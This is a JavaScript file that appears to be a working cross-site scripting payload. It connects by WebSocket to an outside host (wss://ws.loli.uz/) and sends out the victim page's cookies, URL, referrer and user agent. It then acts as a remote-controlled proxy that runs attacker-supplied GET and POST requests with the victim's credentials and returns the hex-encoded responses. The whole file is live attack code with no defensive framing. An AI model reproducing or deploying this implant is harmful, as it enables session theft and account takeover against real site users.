var xss={
        joblist:[],
        init:function(wsaddress){
            var ws = new WebSocket(wsaddress);
            ws.onopen = function(evt) { 
                console.log("Connection open ..."); 
                ws.send(JSON.stringify({
                    'OP':'init',
                    'UA':btoa(navigator.userAgent),
                    'URL':btoa(window.location),
                    'REFERER':btoa(document.referrer),
                    'BASEURL':btoa(window.location.protocol+"//"+window.location.host),
                    'COOKIE':btoa(document.cookie)
                }));
            };
            setInterval(this.ping,3000,ws);
            ws.addEventListener("message", this.handleMessage);
        },
        ping:function(ws){
                if(ws.readyState!=WebSocket.OPEN){
                    return false;
                }
                ws.send(JSON.stringify({
                    'OP':'ping'
                }));
        },
        handleMessage:function(e){
            var act=JSON.parse(e.data);
            if(act.OP){
                switch(act.OP){
                    case "GET":
                        //收到请求后，向服务器发送确认，并且把job添加到joblist
                        //只有当服务器二次确认后才能开始抓取并返回结果
                        this.send(JSON.stringify({
                            'OP':'confirmxhr',
                            'JOBID':act.JOBID
                        }));
                        xss.joblist.push({
                            'JOBID':act.JOBID,
                            'TYPE':'GET',
                            'DETAIL':act,
                        })
                        break;
                    case "POST":
                        this.send(JSON.stringify({
                            'OP':'confirmxhr',
                            'JOBID':act.JOBID
                        }));
                        xss.joblist.push({
                            'JOBID':act.JOBID,
                            'TYPE':'POST',
                            'DETAIL':act,
                        })
                        break;
                }
            }else if(act.STATUS){
                switch(act.STATUS){
                    case 1:
                        //正常，开始处理对应JOBID的事项
                        var work=xss.joblist.find((v)=>{return v.JOBID==act.JOBID;});
                        if(work){
                            //如果JOBLIST里有该项工作
                            switch(work.TYPE){
                                case "GET":
                                    xss.processGET(work.DETAIL,this);
                                    break;
                                case "POST":
                                    xss.processPOST(work.DETAIL,this);
                                    break;
                            }
                            //任务已处理，从队列中删除
                            var i=0;xss.joblist.map((e)=>{if(e.JOBID==act.JOBID){xss.joblist.splice(i,1)};i++;});
                        }
                        break;
                    case 0:
                        //不正常，从队列中删除
                        var i=0;xss.joblist.map((e)=>{if(e.JOBID==act.JOBID){xss.joblist.splice(i,1)};i++;});
                        break;
                }
            }
        },
        processGET:function(act,ws){
            console.log('NEW GET JOB, [GET] URL='+act.URI+' JOBID=' + act.JOBID);
            fetch(act.URI,{credentials:'include'}).then((data)=>{
            	data.arrayBuffer().then((val)=>{return {'val':val,'response':data,'act':act,'ws':ws}}).then((obj)=>{
            		obj.ws.send(JSON.stringify({
                        'OP':'pushxhr',
                        'STATUS_CODE':obj.response.status,
                        'JOBID':obj.act.JOBID,
                        'CT':obj.response.headers.get('content-type'),
                        'CONTENT':xss.buf2hex(obj.val)
                    }));
            	});
            })
        },
        processPOST:function(act,ws){
            console.log('NEW GET JOB, [POST] URL='+act.URI+' JOBID=' + act.JOBID);
            var body=new Int8Array(xss.hex2buf(act.DATA)).buffer;
            fetch(act.URI,{
                credentials:'include',
                method: "POST",
                headers: {
                    "Content-Type": act.CT
                  },
                body: body
            }).then((data)=>{
            	data.arrayBuffer().then((val)=>{return {'val':val,'response':data,'act':act,'ws':ws}}).then((obj)=>{
            		obj.ws.send(JSON.stringify({
                        'OP':'pushxhr',
                        'STATUS_CODE':obj.response.status,
                        'JOBID':obj.act.JOBID,
                        'CT':obj.response.headers.get('content-type'),
                        'CONTENT':xss.buf2hex(obj.val)
                    }));
            	});
            })
        },
        buf2hex:function(buffer) { // buffer is an ArrayBuffer
            return Array.prototype.map.call(new Uint8Array(buffer), x => ('00' + x.toString(16)).slice(-2)).join('');
        },
        hex2buf:function(hex) {
            for (var bytes = [], c = 0; c < hex.length; c += 2)
            bytes.push(parseInt(hex.substr(c, 2), 16));
            return bytes;
        }
    }
xss.init("wss://ws.loli.uz/");